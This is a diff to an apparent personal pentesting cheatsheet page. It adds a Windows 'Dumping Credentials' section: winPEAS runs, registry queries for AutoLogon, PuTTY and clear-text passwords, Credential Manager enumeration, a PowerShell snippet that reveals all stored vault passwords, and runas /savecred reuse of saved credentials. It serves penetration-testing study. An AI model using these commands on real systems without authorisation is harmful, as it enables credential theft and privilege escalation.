@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-exploits" title="Service Exploits">Service Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-exploits" title="Service Exploits">Service Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li></ul></div>
         </div>
     <h2 id="generic-enumeration">Generic Enumeration</h2>
 <p>Run automated checks with various tools:</p>
@@ -283,6 +283,63 @@ reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S<
 <p>Run a MSI installer:</p>
 <div class="highlight"><pre><span></span><code>msiexec<span class="w"> </span>/quiet<span class="w"> </span>/qn<span class="w"> </span>/i<span class="w"> </span>&lt;msi<span class="w"> </span>path&gt;
 </code></pre></div>
+<h2 id="dumping-credentials">Dumping Credentials</h2>
+<p>Use winPEAS to check common password locations:</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>filesinfo<span class="w"> </span>userinfo
+.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>cmd<span class="w"> </span>searchfast<span class="w"> </span>filesinfo
+</code></pre></div>
+<p>Use winPEAS to check for saved credentials:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">winPEASany</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="n">cmd</span> <span class="n">windowscreds</span>
+</code></pre></div>
+<p>Check for <strong>AutoLogon</strong> credentials in registry:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKLM\Software\Microsoft\WindowsNT\CurrentVersion\winlogon"</span>
+</code></pre></div>
+<p>Check for stored Putty sessions credentials in registry:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span>/s
+</code></pre></div>
+<p>Search for clear-text passwords in registers:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
+reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>/f</code> specifies the keyword to search in registers.</li>
+</ul>
+<p>Search credentials in the Windows Credentials Manager (<strong>password ARE NOT shown</strong>):</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># list vaults</span>
+vaultcmd<span class="w"> </span>/list
+
+<span class="c1"># list properties of a vault</span>
+VaultCmd<span class="w"> </span>/listproperties:<span class="s2">"&lt;vault name&gt;"</span>
+
+<span class="c1"># list credentials in a vault</span>
+VaultCmd<span class="w"> </span>/listcreds:<span class="s2">"&lt;vault name&gt;"</span>
+</code></pre></div>
+<p>Dump credentials from the Windows Credentials Manager (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=</span> <span class="p">[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
+<span class="nv">$VaultObj</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span>
+<span class="nv">$VaultObj</span><span class="p">.</span><span class="n">RetrieveAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">RetrievePassword</span><span class="p">();</span> <span class="nv">$_</span> <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>List and use stored credentials with <code>runas</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># List available stored credentials </span>
+cmdkey<span class="w"> </span>/list
+
+<span class="c1"># Use store credentials</span>
+runas<span class="w"> </span>/savecred<span class="w"> </span>/user:&lt;user<span class="w"> </span>listed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span>command&gt;<span class="w"> </span>cmd.exe
+</code></pre></div>
+<p>Search for possibly interesting configuration files (might produce really noisy output):</p>
+<div class="highlight"><pre><span></span><code>dir<span class="w"> </span>/s<span class="w"> </span>*pass*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*.config
+</code></pre></div>
+<p>Recursively search for possible interesting files containing the keyword "password" (might produce really noisy output):</p>
+<div class="highlight"><pre><span></span><code>findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.xml<span class="w"> </span>*.ini<span class="w"> </span>*.txt
+</code></pre></div>
+<p>Look for configuration files or files containing password in the following backup directories:</p>
+<ul>
+<li><code>C:\Windows\Repair</code></li>
+<li><code>C:\Windows\System32\config\RegBack</code></li>
+</ul>
+<p><strong>Take a also a look to <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dumping-credentials">Active Directory Cheatsheet - Dumping Credentials</a>.</strong></p>
   </div>
   <div class="tag-cloud">
     <p>
